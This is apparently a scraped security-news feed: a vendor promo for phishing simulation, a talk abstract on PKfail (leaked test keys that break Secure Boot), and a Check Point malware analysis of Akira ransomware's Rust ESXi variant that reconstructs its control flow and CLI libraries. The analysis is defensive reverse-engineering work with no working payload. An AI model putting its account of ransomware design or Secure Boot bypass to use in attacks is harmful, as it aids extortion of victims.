&lt;p&gt;Finally, &lt;a href="https://www.itgovernance.co.uk/staff-awareness-e-learning-courses" rel="noreferrer noopener" target="_blank"&gt;staff awareness training&lt;/a&gt; offers another valuable boost to your security.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Going the extra mile&lt;/h2&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="alignright size-large is-resized"&gt;&lt;a href="https://www.itgovernance.co.uk/shop/product/meet-the-hacker-simulated-phishing-programme" rel=" noreferrer noopener" target="_blank"&gt;&lt;img alt="" src="https://www.itgovernance.co.uk/shop/images/product/medium/6116.png" style="width: 200px;" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;But to find out whether your training and other measures are effective, consider launching a (simulated) real-world attack.&lt;/p&gt;



&lt;p&gt;Our unique &lt;a href="https://www.itgovernance.co.uk/shop/product/meet-the-hacker-simulated-phishing-programme" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;simulated phishing programme&lt;/strong&gt;&lt;/a&gt; combines interactive staff training, simulated phishing attacks and a session with an ethical hacker to significantly improve your resilience to phishing attacks.&lt;/p&gt;



&lt;p&gt;Following testing, employees will receive personalised feedback on their vulnerabilities, practical advice on phishing detection and a clear understanding of how to protect your organisation better.&lt;/p&gt;



&lt;p&gt;We’ve trialled this programme with various organisations, and the results have been incredible. The live training sessions dramatically reduce the risk of phishing attacks, and end users find the interaction and ability to ask questions invaluable.&lt;/p&gt;

This ensures that end users can confidently rely on the integrity of the underlying hardware, firmware, and software.&lt;/p&gt;
&lt;p&gt;One of the most prevalent mechanisms for enforcing trust in the UEFI firmware ecosystem is Secure Boot, which ensures that only digitally signed and verified software is executed during the system boot process, safeguarding against attacks on “external” firmware components and boot loaders. A key component of Secure Boot is the Platform Key (PK), the root-of-trust key used for managing the cryptographic material that validates external components and bootloaders before execution.&lt;/p&gt;
&lt;p&gt;Given its critical role, one would expect all best practices for cryptographic key management to be meticulously followed, but that has not always been the case. &lt;/p&gt;
&lt;p&gt;In this talk, Binarly’s Alex Matrosov and Fabio Pagani unveil PKfail, a firmware supply-chain security issue affecting major device vendors and hundreds of device models. PKfail is the result of shipping default test keys included by IBVs in their reference implementation—a problem known since 2016 but clearly forgotten by the firmware industry.&lt;/p&gt;
&lt;p&gt;Given these test keys leaked during various data breaches in the past few years, an attacker can leverage PKfail to completely bypass Secure Boot on affected devices. As Alex and Fabio  demonstrate in the presentation, PKfail makes it extremely straightforward to bootkit affected devices and to launch advanced firmware-level threats, such as BlackLotus.&lt;/p&gt;
&lt;p&gt;The speakers also offer a retrospective industry-wide analysis on PKfail, based on their extensive dataset of UEFI firmware images, spanning hundreds of product lines marketed over the past decade.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;

According to this update, for a while in early 2024, Akira affiliates experimented with promoting a new cross-platform variant of the ransomware called [&amp;#8230;]&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2024/inside-akira-ransomwares-rust-experiment/"&gt;Inside Akira Ransomware&amp;#8217;s Rust Experiment&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Executive Summary&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Check Point Research analyzed the construction and control flow of Akira ransomware’s Rust version that circulated in early 2024, which has specific features uniquely targeting ESXi server. Our analysis demonstrates how Rust idioms, boilerplate code, and compiler strategies come together to account for the complicated assembly.&lt;/li&gt;



&lt;li&gt;The report outlines principles to follow when analyzing ITW Rust binaries in general.&lt;/li&gt;



&lt;li&gt;We present an analysis of the design strategies used by the malware’s authors, as indicated by the assembly and parts of the reconstructed source code.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;Earlier this year, Talos &lt;a href="https://blog.talosintelligence.com/akira-ransomware-continues-to-evolve/"&gt;published&lt;/a&gt; an update on the ongoing evolution of Akira ransomware-as-a-service (RaaS) that has become one of the more prominent players in the current ransomware landscape. According to this update, for a while in early 2024, Akira affiliates experimented with promoting a new cross-platform variant of the ransomware called “Akira v2.” This new version was written in Rust and was capable of targeting ESXi bare metal hypervisor servers.&lt;/p&gt;



&lt;p&gt;Executables written in Rust have a reputation for being particularly challenging to reverse-engineer. While it is often possible to answer specific research questions, such as “What file extensions are being targeted?” or “What encryption method is being used?”, this is usually achieved by finding ways to circumvent a comprehensive analysis at the assembly level. This is, of course, a pragmatic and cost-effective approach. However, if we set it aside for a moment, we might glean some interesting insights.&lt;/p&gt;



&lt;p&gt;While we do answer many of the above-mentioned ‘usual’ research questions about a given ransomware strain in this text, this is not the focus nor the main objective here.&lt;/p&gt;



&lt;p&gt;Our earlier research, &lt;a href="https://research.checkpoint.com/2023/rust-binary-analysis-feature-by-feature/"&gt;Rust Binary Analysis Feature by Feature&lt;/a&gt;, was conducted in a laboratory setting. We examined the language features as they appear in &lt;a href="https://doc.rust-lang.org/book/"&gt;Klabnik’s and Nichols’ “The Rust Programming Language”&lt;/a&gt;, and observed the idioms the Rust compiler uses to implement them in assembly. We controlled the source code and took care to compile in &lt;code&gt;Debug&lt;/code&gt; mode so that the compiler would not complicate our lives with surprising optimizations.&lt;/p&gt;



&lt;p&gt;In this publication, we engage that theory with the real world: an actual Rust malware that uses various standard library and third-party crates, and was compiled in &lt;code&gt;Release&lt;/code&gt; mode. We note the design choices made by the malware authors and the involved Rust constructs and see how both translate into assembly – sometimes in surprising ways that lab work did not prepare us for. Our main aim is to break through that technical barrier and reach a capital-U Understanding of this Rust binary and its control flow.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Overview&lt;/h2&gt;



&lt;p&gt;We earlier noted that the binary was compiled in &lt;code&gt;Release&lt;/code&gt; mode; however, there isn’t a clear flag indicating this. We assume this since firstly, some compiler optimizations we discuss later definitely should not be present in a &lt;code&gt;Debug&lt;/code&gt; build; and secondly, the binary debug information has no source lines, which are typically included by default in a &lt;code&gt;Debug&lt;/code&gt; build, as seen below (a good way to test for these is by using the command &lt;code&gt;objdump --source &amp;lt;binary&amp;gt; | grep "let "&lt;/code&gt;).&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-30868" height="759" src="https://research.checkpoint.com/wp-content/uploads/2024/12/debug_objdump_1-1024x759.png" style="width: 610px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1. Objdump of a test program that was compiled in debug mode. The original source is visible.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The ransomware’s control flow, from its root to the encryption logic, is as follows:&lt;/p&gt;



&lt;p&gt;&lt;code&gt;Main&lt;/code&gt; -&amp;gt; &lt;code&gt;default_action&lt;/code&gt; -&amp;gt; &lt;code&gt;lock&lt;/code&gt; -&amp;gt; &lt;code&gt;lock_closure&lt;/code&gt;&lt;/p&gt;



&lt;p&gt;Broadly speaking, &lt;code&gt;Main&lt;/code&gt; parses arguments, &lt;code&gt;default_action&lt;/code&gt; determines program behavior and collects targeted files, and &lt;code&gt;lock&lt;/code&gt; is a wrapper that launches threads that carry out the actual encryption logic that lives in &lt;code&gt;lock_closure&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;Maybe you are unpleasantly surprised by how cyber criminals are so far gone that the “default action,” in their eyes, is destroying your machine and encrypting all the files on it. However, as we will later see, there is a perfectly reasonable explanation for why this is so.&lt;/p&gt;



&lt;p&gt;We will now sequentially analyze each of the above-mentioned functions and observe how control flows from one to the next.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Main function&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;Command Line Arguments&lt;/h3&gt;



&lt;p&gt;This malware has a full-fledged CLI, and as a consequence, command-line arguments play a significant role in the way it functions. The first thing the malware does is obtain them (the original source is &lt;code&gt;let program_args: Vec&amp;lt;String&amp;gt; = args().collect()&lt;/code&gt;).&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30869" height="127" src="https://research.checkpoint.com/wp-content/uploads/2024/12/args_collect.png" width="439" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2. Compiled assembly of &lt;code&gt;args.().collect()&lt;/code&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;This brings us to our first natural question: How are program arguments stored in memory?&lt;/p&gt;



&lt;p&gt;According to the official documentation, &lt;code&gt;std::env::args&lt;/code&gt; returns &lt;code&gt;std::env::Args&lt;/code&gt;, a type that implements &lt;code&gt;Iterator&amp;lt;Item=String&amp;gt;&lt;/code&gt;, meaning that it implements a function &lt;code&gt;next() -&amp;gt; Option&amp;lt;String&amp;gt;&lt;/code&gt;. However, this does not guarantee what the underlying implementation looks like. (In fact, Rust supports dynamic dispatch, allowing some objects to implement a trait even when the underlying implementation is not known at compile time &amp;#8212; although this is not the case here, we will see this feature in action later.)&lt;/p&gt;



&lt;p&gt;&lt;code&gt;std::env::Args&lt;/code&gt; is &lt;a href="https://github.com/rust-lang/rust/blob/db034cee00570a9b82ea8b9e9e95221dbd745698/library/std/src/env.rs#L756"&gt;implemented&lt;/a&gt; as a wrapper for another type called &lt;code&gt;ArgsOs&lt;/code&gt;. This type, in turn, is implemented using &lt;code&gt;sys::args::Args&lt;/code&gt;, a type returned by &lt;code&gt;args_os()&lt;/code&gt;, which calls the function &lt;code&gt;sys::args::args()&lt;/code&gt;. At this point, you may dutifully look for &lt;code&gt;sys::args::args&lt;/code&gt; in the Rust standard library sources. You will not find it there;&amp;nbsp;since this code is OS-dependent, it is part of the Platform Abstraction Layer (PAL), which swaps in the correct code at compile time depending on the targeted OS. So, &lt;a href="https://github.com/rust-lang/rust/blob/db034cee00570a9b82ea8b9e9e95221dbd745698/library/std/src/sys/pal/unix/args.rs#L18"&gt;the implementation&lt;/a&gt; is in &lt;code&gt;std::src::sys::pal::unix::args&lt;/code&gt;. It first invokes an arcane function (&lt;code&gt;argc_argv&lt;/code&gt;, &lt;a href="https://github.com/rust-lang/rust/blob/db034cee00570a9b82ea8b9e9e95221dbd745698/library/std/src/sys/pal/unix/args.rs#L168"&gt;implementation here&lt;/a&gt;) that directly pulls these values via calling the C FFI. Then it manually, painstakingly &lt;a href="https://github.com/rust-lang/rust/blob/db034cee00570a9b82ea8b9e9e95221dbd745698/library/std/src/sys/pal/unix/args.rs#L23"&gt;converts&lt;/a&gt; this tuple into a &lt;code&gt;Vec&amp;lt;OsString&amp;gt;&lt;/code&gt;. The complete code of &lt;code&gt;sys::args::args&lt;/code&gt; is included below.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;pub fn args() -&gt; Args {
    let (argc, argv) = imp::argc_argv();
    let mut vec = Vec::with_capacity(argc as usize);
    for i in 0..argc {
        let ptr = unsafe { argv.offset(i).read() };
        if ptr.is_null() {
             break;
        }
        let cstr = unsafe { CStr::from_ptr(ptr) };
        vec.push(OsStringExt::from_vec(cstr.to_bytes().to_vec()));
    }
    Args { iter: vec.into_iter() }
}
&lt;/pre&gt;



&lt;p&gt;So, if we squint at that last line and put together all the pieces of the puzzle, we can conclude that &lt;code&gt;Args&lt;/code&gt; under the hood has the output type of &lt;code&gt;impl into_iter for Vec&amp;lt;OsString&amp;gt;&lt;/code&gt;. However, figuring out the actual type still requires navigating murky waters. The &lt;code&gt;into_iter&lt;/code&gt; method is &lt;a href="https://doc.rust-lang.org/std/iter/trait.IntoIterator.html"&gt;provided&lt;/a&gt; by the &lt;code&gt;IntoIterator&lt;/code&gt; trait (&lt;code&gt;std::iter::IntoIterator&lt;/code&gt;), which has a type parameter called &lt;code&gt;IntoIter&lt;/code&gt;. Meanwhile, the documentation for &lt;code&gt;std::vec::Vec&lt;/code&gt; &lt;a href="https://doc.rust-lang.org/std/vec/struct.Vec.html#impl-IntoIterator-for-%26Vec%3CT,+A%3E"&gt;lists&lt;/a&gt; three different implementations of &lt;code&gt;impl into_iter for Vec&lt;/code&gt;:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30870" height="755" src="https://research.checkpoint.com/wp-content/uploads/2024/12/into_iter_three_impls.png" style="width: 480px; height: auto;" width="1012" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3. Implementations of &lt;code&gt;into_iter&lt;/code&gt; for &lt;code&gt;Vec&lt;/code&gt;.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;One of these returns a type &lt;a href="https://doc.rust-lang.org/std/vec/struct.IntoIter.html"&gt;named&lt;/a&gt; &lt;code&gt;IntoIter&lt;/code&gt; (&lt;code&gt;std::vec:::IntoIter&lt;/code&gt;), unrelated to the associated type parameter &lt;code&gt;IntoIter&lt;/code&gt; of &lt;code&gt;std::iter::IntoIterator&lt;/code&gt; – they&amp;nbsp;&lt;em&gt;happen &lt;/em&gt;to have the same name. At this point, we will mercifully note that the third implementation, highlighted in yellow above, is the one invoked by &lt;code&gt;sys::args::args&lt;/code&gt; (the other two are for a &lt;em&gt;reference&lt;/em&gt; to a vector). This is to say, &lt;code&gt;Args&lt;/code&gt; are kept in memory as an &lt;code&gt;IntoIter&amp;lt;OsString&amp;gt;&lt;/code&gt;.&lt;/p&gt;



&lt;p&gt;We still need to determine the implications of this, concrete-byte-wise. The &lt;code&gt;vec::IntoIter&lt;/code&gt; documentation can be found &lt;a href="https://doc.rust-lang.org/nomicon/vec/vec-into-iter.html"&gt;here&lt;/a&gt;, and this structure is defined as follows:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;pub struct IntoIter&amp;lt;T&gt; {
    buf: NonNull&amp;lt;T&gt;,
    cap: usize,
    start: *const T,
    end: *const T,
}
&lt;/pre&gt;



&lt;p&gt;An &lt;code&gt;OsString&lt;/code&gt; is &lt;a href="https://github.com/rust-lang/rust/blob/bd0826a4521a845f36cce1b00e1dd2918ba09e90/library/std/src/ffi/os_str.rs#L91"&gt;implemented&lt;/a&gt; as a &lt;code&gt;sys::os_str::Buf&lt;/code&gt;, and its precise implementation varies between operating systems. In Linux it is represented as a standard three-field &lt;code&gt;Vec&amp;lt;u8&amp;gt;&lt;/code&gt; consisting of &lt;code&gt;length&lt;/code&gt;, &lt;code&gt;buf&lt;/code&gt;, and &lt;code&gt;capacity&lt;/code&gt;. In contrast, for Windows the compiler &lt;a href="https://github.com/rust-lang/rust/blob/bd0826a4521a845f36cce1b00e1dd2918ba09e90/library/std/src/sys_common/wtf8.rs#L133"&gt;uses&lt;/a&gt; a custom solution called &lt;a href="https://simonsapin.github.io/wtf-8/"&gt;WTF8 encoding&lt;/a&gt; – “a hack intended to be used internally in self-contained systems with components that need to support potentially ill-formed UTF-16 for legacy reasons”. The relevant type, &lt;a href="https://stdrs.dev/nightly/x86_64-pc-windows-gnu/std/sys_common/wtf8/struct.Wtf8Buf.html"&gt;Wtf8Buf&lt;/a&gt;, includes an additional field, &lt;code&gt;is_known_utf8&lt;/code&gt;, bringing the total number of fields to four.&lt;/p&gt;



&lt;p&gt;Looking at the &lt;code&gt;args&lt;/code&gt; variable in memory right after &lt;code&gt;std::env::args&lt;/code&gt; is called, we can confirm the structure of the &lt;code&gt;IntoIter&amp;lt;OsString&amp;gt;&lt;/code&gt;:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30871" height="112" src="https://research.checkpoint.com/wp-content/uploads/2024/12/args_in_memory.png" width="696" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4. &lt;code&gt;IntoIter&amp;lt;OsString&amp;gt;&lt;/code&gt; structure in memory.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Below is the internal buffer of OsStrings for the arguments which we ran a test Windows program compiled from the same source: (the value 0x274ad87f101 is an artifact of the WTF8 encoding)&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30872" height="440" src="https://research.checkpoint.com/wp-content/uploads/2024/12/argbuf.png" width="684" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5. &lt;code&gt;OsString&lt;/code&gt;s in sequence, pointed at by the buf pointer of the &lt;code&gt;IntoIter&amp;lt;OsString&amp;gt;&lt;/code&gt;.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading"&gt;CLI Parser&lt;/h3&gt;



&lt;p&gt;After the command line arguments are collected, many writes to stack memory are followed by a call to a function called &lt;code&gt;default_action&lt;/code&gt;. We will explore the details of this function later, but its name raised our suspicions that it might be a sample or boilerplate code of some kind. After all, it is hard to imagine someone deliberately naming a function “default action”. &amp;nbsp;A quick web search for this function name &lt;a href="https://github.com/ksk001100/seahorse"&gt;locates&lt;/a&gt; the &lt;code&gt;seahorse&lt;/code&gt; crate, which is a CLI framework. In one of its numerous “hello world” examples, we &lt;a href="https://github.com/ksk001100/seahorse?tab=readme-ov-file#multiple-command-application"&gt;find&lt;/a&gt; the following code:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;use seahorse::{App, Context, Command};
use std::env;

fn main() {
    let args: Vec&amp;lt;String&gt; = env::args().collect();
    let app = App::new(env!("CARGO_PKG_NAME"))
        .description(env!("CARGO_PKG_DESCRIPTION"))
        .author(env!("CARGO_PKG_AUTHORS"))
        .version(env!("CARGO_PKG_VERSION"))
        .usage("cli [name]")
        .action(default_action)
        .command(add_command())
        .command(sub_command());

    app.run(args);
}

fn default_action(c: &amp;amp;Context) {
    println!("Hello, {:?}", c.args);
}
&lt;/pre&gt;



&lt;p&gt;Now we know where the name &lt;code&gt;default_action&lt;/code&gt; came from. The malware sources must have contained this code block or something a lot like it (the string &lt;code&gt;cli [name]&lt;/code&gt; also appears as-is). It is clear that the struct being initialized with all those stack writes is a seahorse &lt;code&gt;App&lt;/code&gt;. This struct is &lt;a href="https://github.com/ksk001100/seahorse/blob/master/src/app.rs#L9"&gt;implemented&lt;/a&gt; in the following way:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;pub struct App {
    pub name: String,
    pub author: Option&amp;lt;String&gt;,
    pub description: Option&amp;lt;String&gt;,
    pub usage: Option&amp;lt;String&gt;,
    pub version: Option&amp;lt;String&gt;,
    pub commands: Option&amp;lt;Vec&amp;lt;Command&gt;&gt;,
    pub action: Option&amp;lt;Action&gt;,
    pub action_with_result: Option&amp;lt;ActionWithResult&gt;,
    pub flags: Option&amp;lt;Vec&amp;lt;Flag&gt;&gt;,
}
&lt;/pre&gt;



&lt;p&gt;This allows us to decipher the initialization of the &lt;code&gt;App&lt;/code&gt; struct:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30873" height="512" src="https://research.checkpoint.com/wp-content/uploads/2024/12/app_init.png" style="width: 333px; height: auto;" width="589" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6. Initialization of the &lt;code&gt;App&lt;/code&gt; object.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The assembly then proceeds to initialize the long list of supported CLI flags (the below image accounts for the first two):&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30874" height="683" src="https://research.checkpoint.com/wp-content/uploads/2024/12/flag_init.png" style="width: 385px; height: auto;" width="687" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7. Repeated calls to seahorse methods manipulating the &lt;code&gt;App&lt;/code&gt; object in preparation for calling &lt;code&gt;run&lt;/code&gt;.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Then finally calls &lt;code&gt;run&lt;/code&gt;, transferring control to &lt;code&gt;default_action&lt;/code&gt;.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;The Immediate Puzzle&lt;/h3&gt;



&lt;p&gt;This is the function that is launched by the &lt;code&gt;seahorse&lt;/code&gt; boilerplate code we saw earlier. When we look at its disassembly, we are immediately greeted by a startling sight:&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-30875" height="828" src="https://research.checkpoint.com/wp-content/uploads/2024/12/default_action.png" style="width: 157px; height: auto;" width="339" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8. &lt;code&gt;default_action&lt;/code&gt; overview.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;

&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-30876" height="572" src="https://research.checkpoint.com/wp-content/uploads/2024/12/default_action_inlined_start-1024x572.png" style="width: 708px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9. &lt;code&gt;default_action&lt;/code&gt; first few basic blocks.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The malware authors apparently implement their desired functionality by… directly calling the C FFI function &lt;code&gt;from_bytes_with_nul&lt;/code&gt; and then &lt;code&gt;std::fs::buffer_capacity_required&lt;/code&gt;? This is unexpected. There are several dozen more eyebrow-raising basic blocks of this kind — the entire upper half of &lt;code&gt;default_action&lt;/code&gt; (diagram above) is code like this. The &lt;em&gt;pièce de résistance&lt;/em&gt; is &lt;em&gt;this&lt;/em&gt; basic block, which should be the final clue that if you have been trying to parse and decompile this assembly directly in your brain, then you should probably stop.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30877" height="343" src="https://research.checkpoint.com/wp-content/uploads/2024/12/complex_neck.png" width="187" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10. &lt;code&gt;default_action&lt;/code&gt; basic block featuring optimized instructions.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Actually this is just one-tenth of that basic block, which goes on for a mind-numbing 200-odd instructions.&lt;/p&gt;



&lt;p&gt;What gives?&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Pull the Thread&lt;/h3&gt;



&lt;p&gt;To provide an operator-friendly visual representation of what the malware is doing, the authors used the library &lt;code&gt;indicatif&lt;/code&gt;, &lt;a href="https://github.com/console-rs/indicatif"&gt;which is&lt;/a&gt; “a Rust library for indicating progress in command line applications to users [.. that] provides progress bars and spinners as well as basic color support, but there are bigger plans for the future”. &lt;code&gt;indicatif&lt;/code&gt; output is true eye candy for CLI fans:&lt;/p&gt;



&lt;figure style="text-align: center;"&gt;
&lt;img src="https://github.com/console-rs/indicatif/raw/main/screenshots/yarn.gif" style="text-align: center;" /&gt;
&lt;figcaption&gt;Figure 11. Demonstration of indicatif functionality, taken from the project repository’s readme.&lt;/figcaption&gt;
&lt;/figure&gt;



&lt;p&gt;We invite you to put yourself in the malware operator’s shoes for a moment, seeing this colorful box full of emojis and progress bars as it cheerfully declares “destroying backups”, “generating symmetric session key”, “encrypting VM”, “writing ransom note”. Truly, the future is here! Just like the &lt;code&gt;seahorse&lt;/code&gt; project page, the &lt;code&gt;indicatif&lt;/code&gt; project page contains several ‘hello world’ examples, and one of them is the source for the above eye-catching demo: &lt;a href="https://github.com/console-rs/indicatif/blob/main/examples/yarnish.rs"&gt;yarnish.rs&lt;/a&gt;. We will get to the full code later, but one particular feature of it is that it is multithreaded, and has the following outline:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;let handles: Vec&amp;lt;_&gt; = (0..4u32).map(|i| {
				...
        thread::spawn(move || { ... })
        ...
    })
    .collect();
...
&lt;/pre&gt;



&lt;p&gt;We have good reason to suspect that the source in &lt;code&gt;yarnish.rs&lt;/code&gt;, or rather, code heavily inspired by it, appears verbatim in the malware source (more on this later). Sadly, this alone still does not explain why Akira’s &lt;code&gt;default_action&lt;/code&gt; begins with a deluge of basic blocks invoking the C FFI and other low-level functionality. To account for that, we need to consider that the malware authors introduced a small modification to the above source — one that, on their own end, must have been an afterthought. This snippet in the original boilerplate:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;let handles: Vec&amp;lt;_&gt; = (0..4u32)
    .map(|i| ...
&lt;/pre&gt;



&lt;p&gt;Hard-codes the number of threads to 4, which, as the malware authors noted correctly, is nice for a “hello world” example but not befitting of production code. So, first of all, they added &lt;code&gt;seahorse&lt;/code&gt; code allowing the malware operator to control the number of launched threads directly, using the following command line argument:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;--threads &amp;lt;int&gt; Number of threads (1-1000)
&lt;/pre&gt;



&lt;p&gt;Then they (again correctly) asked themselves, “but what if the operator doesn’t supply a value for this flag? What is the right thing to do?” then, after a moment of thought, they added the following:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;--threads &amp;lt;int&gt; Number of threads (1-1000). Default: number of logical CPU cores
&lt;/pre&gt;



&lt;p&gt;And modified the source code to something like:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;let threads : u32 = match threads_flag_value {
	Some(n) =&gt; n,
	None =&gt; available_parallelism().unwrap()
}
...
let handles: Vec&amp;lt;_&gt; = (0..threads)
    .map(|i| ...
&lt;/pre&gt;



&lt;p&gt;We will now delve into the functions that &lt;code&gt;available_parallelism&lt;/code&gt; calls, the functions &lt;em&gt;these&lt;/em&gt; functions call, and so on for several layers of the call stack. The grim motivation for this will become clearer soon (and you might be able to already guess at it).&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;Inline-ception&lt;/h3&gt;



&lt;p&gt;The function &lt;code&gt;available_parallelism() -&amp;gt; Result&amp;lt;NonZero&amp;lt;usize&amp;gt;&amp;gt;&lt;/code&gt; (&lt;a href="https://github.com/rust-lang/rust/blob/b11fbfbf351b94c7eecf9e6749a4544a6d4717fa/library/std/src/sys/pal/unix/thread.rs#L309"&gt;source&lt;/a&gt;), according to &lt;a href="https://doc.rust-lang.org/beta/std/thread/fn.available_parallelism.html"&gt;its documentation&lt;/a&gt;, “returns an estimate of the default amount of parallelism a program should use [..] This number often corresponds to the number of CPUs a computer has, but it may diverge in various cases”. The implementation of this function for Linux targets is below.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;{
    quota = cgroups::quota().max(1);
    let mut set: libc::cpu_set_t = unsafe { mem::zeroed() };
    unsafe {
        if libc::sched_getaffinity(0, mem::size_of::&amp;lt;libc::cpu_set_t&gt;(), &amp;amp;mut set) == 0 {
            let count = libc::CPU_COUNT(&amp;amp;set) as usize;
            let count = count.min(quota);
            if let Some(count) = NonZeroUsize::new(count) {
                return Ok(count)
            }
        }
    }
}
match unsafe { libc::sysconf(libc::_SC_NPROCESSORS_ONLN) } {
    -1 =&gt; Err(io::Error::last_os_error()),
    0 =&gt; Err(io::const_io_error!(io::ErrorKind::NotFound, "The number of hardware threads is not known for the target platform")),
    cpus =&gt; {
        let count = cpus as usize;
        let count = count.min(quota);
        Ok(unsafe { NonZeroUsize::new_unchecked(count) })
    }
}
&lt;/pre&gt;



&lt;p&gt;The undocumented function &lt;code&gt;quota() -&amp;gt; usize&lt;/code&gt; (&lt;a href="https://github.com/rust-lang/rust/blob/b11fbfbf351b94c7eecf9e6749a4544a6d4717fa/library/std/src/sys/pal/unix/thread.rs#L492"&gt;source&lt;/a&gt;), according to the in-source comments, “returns cgroup CPU quota in core-equivalents, rounded down or &lt;code&gt;usize::MAX&lt;/code&gt; if the quota cannot be determined or is not set.” The implementation of this function, which we’ve again redacted for brevity, goes like so:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;pub(super) fn quota() -&gt; usize {
    let _: Option&amp;lt;()&gt; = try {
        let mut buf = Vec::with_capacity(128); // find our place in the cgroup hierarc
        File::open("/proc/self/cgroup").ok()?.read_to_end(&amp;amp;mut buf).ok()?;
                        
        quota = match version {
            Cgroup::V1 =&gt; quota_v1(cgroup_path),
            Cgroup::V2 =&gt; quota_v2(cgroup_path),
        };
    };
    quota
}

&lt;/pre&gt;



&lt;p&gt;The undocumented &lt;code&gt;quota_v1&lt;/code&gt; (&lt;a href="https://github.com/rust-lang/rust/blob/b11fbfbf351b94c7eecf9e6749a4544a6d4717fa/library/std/src/sys/pal/unix/thread.rs#L587"&gt;source&lt;/a&gt;) and &lt;code&gt;quota_v2&lt;/code&gt; (&lt;a href="https://github.com/rust-lang/rust/blob/b11fbfbf351b94c7eecf9e6749a4544a6d4717fa/library/std/src/sys/pal/unix/thread.rs#L539C8-L539C16"&gt;source&lt;/a&gt;) are sub-implementations of &lt;code&gt;quota&lt;/code&gt; for different versions of the &lt;a href="https://en.wikipedia.org/wiki/Cgroups"&gt;Linux Control Groups API&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Meanwhile, the function &lt;code&gt;libc::CPU_COUNT&lt;/code&gt; (&lt;a href="https://github.com/rust-lang/libc/blob/86b04cbc9dbf56d1518a9552799cff49df775385/src/teeos/mod.rs#L1383"&gt;source&lt;/a&gt;) is a thin wrapper for &lt;code&gt;CPU_COUNT_S&lt;/code&gt; (&lt;a href="https://github.com/rust-lang/libc/blob/86b04cbc9dbf56d1518a9552799cff49df775385/src/teeos/mod.rs#L1373"&gt;source&lt;/a&gt;), which has the following implementation:&lt;/p&gt;



